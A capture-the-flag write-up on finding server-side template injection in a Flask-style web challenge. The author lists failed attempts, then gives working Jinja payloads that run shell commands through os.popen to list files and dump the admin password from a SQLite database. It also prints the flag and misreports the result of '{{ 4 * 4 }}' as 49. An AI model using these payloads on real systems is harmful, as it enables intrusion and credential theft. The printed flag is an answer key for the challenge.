This challenge took a while to solve—not because the solution was inherently difficult, but because it was deceptively easy to overlook. I went down countless rabbit holes, exploring every possible avenue before stumbling upon the answer.

## The Wild Goose Chase

### SQL Injection (Because Why Not?)

First, I tried SQL injection. I knew they claimed to have fixed it, but hey—can't hurt to try, right? No luck.

### Byte Sequence Shenanigans

Next, I experimented with weird byte sequences in the username and password fields. Maybe `admin\0` would be confused with `admin`? Nope.

### The Null User Glitch

I discovered a bizarre edge case: if I sent a raw POST request without specifying a username or password, the site would still create a user—probably storing `NULL` in the database. The resulting cookie had `'user': ""`, and the frontend would show the login screen (thinking I was logged out), but the user _did_ exist. I could still like photos by manually sending POST requests with the cookie, and those likes _actually persisted_—other users could see them.

### The Mysterious Cookie

The cookie itself had quirks. Sometimes it started with `Ey...`, other times with `.Ey...`—what was that leading dot? After some digging, I realized they were likely using `URLSafeTimedSerializer`:

- First field: payload
- Second field: timestamp
- Third field: signature

### The (Failed) Cookie Crack Attempt

Armed with this knowledge, I tried brute-forcing the cookie’s secret key using `rockyou.txt`. If I could forge a cookie, maybe there was a hidden admin panel? No dice—the key held strong.

### The Phantom Timing Oracle

I then hunted for timing oracles. Maybe password checks leaked info via response times? I created test users and bombarded the login endpoint, even SSH’d into the server to minimize network noise.

Results? Inconclusive. A password like `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA` took _almost the same time_ as `AAA`. Either the check was constant-time, or the difference was too small to measure.

### Pickle and SSTI: False Negatives

I also tried:

- **Pickle injection** → Nothing.
- **SSTI (Server-Side Template Injection)** → Initially seemed to fail.

At this point, I was out of ideas.

## Reverse Engineering

With no leads left, I started reverse-engineering the site’s behavior, documenting every quirk and edge case. Sometimes, stepping back helps you see the bigger picture—or in this case, the _one page_ I’d overlooked.

### The Forgotten SSTI Vector

I’d tried SSTI on the "Welcome, [user]!" page, but it didn’t work. What I _missed_ was another page that also rendered the username:

> **"HEY [user]! STOP TRYING TO HACK US, WE KNOW WHO YOU ARE!"**

This appeared under certain conditions, like:

- Making a `/face` request with an ID longer than 16 bytes.
- Having an expired or incorrect CSRF token.

### The Payload That Worked

I registered a user with the username `{{ 4 * 4 }}`, intentionally triggered the error page, and—**"Hey 49! ..."**

_SSTI was alive and well._

## The Exploit: From SSTI to Admin Creds

### Step 1: Testing Command Execution

First try:

```jinja
{{ config.__class__.__init__.__globals__['os'].popen('ls -la').read() }}
```

Got slapped with:

```
User already exists.
```

Motherf- SOMEONE ALREADY TOOK MY PAYLOAD. Fine. _Fine._ Let's add a space:

```jinja
{{ config.__class__.__init__.__globals__['os'].popen('ls -la ').read() }}
```

Worked. Of course it did. Because CTF.

### Step 2: Directory Listing

The server spat back:

```html
<h1 style="color:red">
  HEY, total 236 drwxr-x--- 4 hacksports the-face-book-2_0 4096 May 18 20:19 .
  drwxr-x--x 87 root root 4096 May 26 04:25 .. -r--r----- 1 hacksports
  the-face-book-2_0 20480 May 18 21:02 backup.db -rw-rw---- 1 hacksports
  the-face-book-2_0 188416 May 28 21:02 facebook.db
  <!-- JACKPOT -->
  -rw-rw-r-- 1 hacksports hacksports 4712 May 18 21:02 server.py drwxr-xr-x 3
  root root 4096 May 18 20:19 static drwxr-xr-x 2 root root 4096 May 18 20:19
  templates -rwxr-sr-x 1 hacksports the-face-book-2_0 209 May 18 21:02
  xinetd_wrapper.sh ! STOP TRYING TO HACK US! WE KNOW WHO YOU ARE!!!!
</h1>
```

That `facebook.db` looked juicy - clearly the active database compared to `backup.db`.

### Step 3: Dumping Admin Creds

Next payload (with proper SQLite escaping):

```jinja
{{ config.__class__.__init__.__globals__['os'].popen('sqlite3 ./facebook.db "SELECT * FROM users WHERE name = \'admin\';"').read() }}
```

**Boom.** The server angrily responded with gold:

```html
<h1 style="color:red">
  HEY, admin|new_technology_means_new_bugs|1 ! STOP TRYING TO HACK US! WE KNOW
  WHO YOU ARE!!!!
</h1>
```

### The Flag

Admin password (and challenge flag):  
`new_technology_means_new_bugs`
